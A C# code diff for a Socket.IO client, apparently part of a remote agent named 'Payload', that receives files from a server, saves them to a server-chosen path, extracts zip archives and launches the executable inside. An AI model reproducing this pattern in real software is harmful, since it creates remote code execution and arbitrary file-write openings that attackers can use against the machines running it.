@@ -25,13 +25,15 @@ namespace Payload.Core.Command.SocketClient
         public string data { get; set; }
     }
 
-    public class UpgradeProps
+    public class UploadProps
     {
         public byte[] file { get; set; }
         public string name { get; set; }
+        public string path { get; set; }
+        public string action { get; set; }
     }
 
-    public class UpgradeResProps : IBasicResProps<UpgradeProps> { }
+    public class UploadReqProps : IBasicResProps<UploadProps> { }
 
 
     public class SocketIoClient
@@ -49,50 +51,71 @@ namespace Payload.Core.Command.SocketClient
         private void Init()
         {
             OnWallpaper();
-            OnUpgrade();
+            OnUpload();
             OnMyResponse();
         }
 
         private void OnMyResponse()
         {
+            if (Config.IsRelease())
+                return;
             client.On("my_response", async response => {
                 Console.WriteLine(response);
             });
         }
-
-        private void OnUpgrade()
+        private bool InstallPatch(UploadProps props)
         {
-            client.On("upgrade", async response => {
+            bool patchUnziped = false;
+            if (!props.name.ToLower().EndsWith("zip") || (!props.action.ToLower().Equals("upgrade") && !props.action.ToLower().Equals("exe")) )
+                return patchUnziped;
+            try
+            {
+                string patchPath = $"{props.path}\\{props.name}";
+                System.IO.Compression.ZipFile.ExtractToDirectory(patchPath, props.path);
+                patchUnziped = true;
+            }
+            catch { }
+            if (!patchUnziped)
+                return patchUnziped;
+            string exeName = "";
+            FileInfo[] allFiles = new DirectoryInfo(props.path).GetFiles("*.exe");
+            if (allFiles.Length == 1)
+                exeName = allFiles[0].Name;
+            new StartProcessFactory(
+                new StartProcessCommandProps() { ExeName = exeName, TargetWorkSpaceDir = props.path }
+                )
+            .CreateCommand()
+                .Execute();
+            return patchUnziped;
+        }
+
+        private UploadProps HandlePath(UploadProps props)
+        {
+            string path = props.path;
+            string defaultPath = $"{Config.Instance.TargetUpgradeDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss")}_{{0}}";
+
+            switch (props.action.ToLower())
+            {
+                case "upgrade":
+                    path = string.Format(defaultPath, "patch");
+                    break;
+                case "exe":
+                    path = string.Format(defaultPath, "exe");
+                    break;
+            }
+            props.path = path;
+            return props;
+        }
+
+        private void OnUpload()
+        {
+            client.On("upload", async response => {
                 Console.WriteLine(response);
-                UpgradeResProps upgradeProps = response.GetValue<UpgradeResProps>();
-                UpgradeProps patch = upgradeProps.data;
-                if (!patch.name.ToLower().EndsWith("zip"))
-                    return;
-                string targetDir = $"{Config.Instance.TargetUpgradeDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss")}_patch";
-                if(Directory.Exists(targetDir))
-                    Directory.Delete(targetDir, true);
-                Directory.CreateDirectory(targetDir);
-                string patchPath = $"{targetDir}\\{patch.name}";
-                BytesHelper.ByteArrayToFile(patchPath, patch.file);
-                bool patchUnziped = false;
-                try
-                {
-                    System.IO.Compression.ZipFile.ExtractToDirectory(patchPath, targetDir);
-                    patchUnziped = true;
-                }
-                catch { }
-                if (!patchUnziped)
-                    return;
-                string exeName = "";
-                FileInfo[] allFiles = new DirectoryInfo(targetDir).GetFiles("*.exe");
-                if(allFiles.Length==1)
-                    exeName = allFiles[0].Name;
-                new StartProcessFactory(
-                    new StartProcessCommandProps() { ExeName = exeName, TargetWorkSpaceDir= targetDir }
-                    )
-                .CreateCommand()
-                    .Execute()
-                    ?.Wait();
+                UploadReqProps reqProps = response.GetValue<UploadReqProps>();
+                UploadProps props = reqProps.data;
+                bool saved = FileHelper.SaveFile(HandlePath(props));
+                Console.WriteLine($"{props.path}\\{props.name} :: saved = {saved}");
+                InstallPatch(props);
             });
         }
 
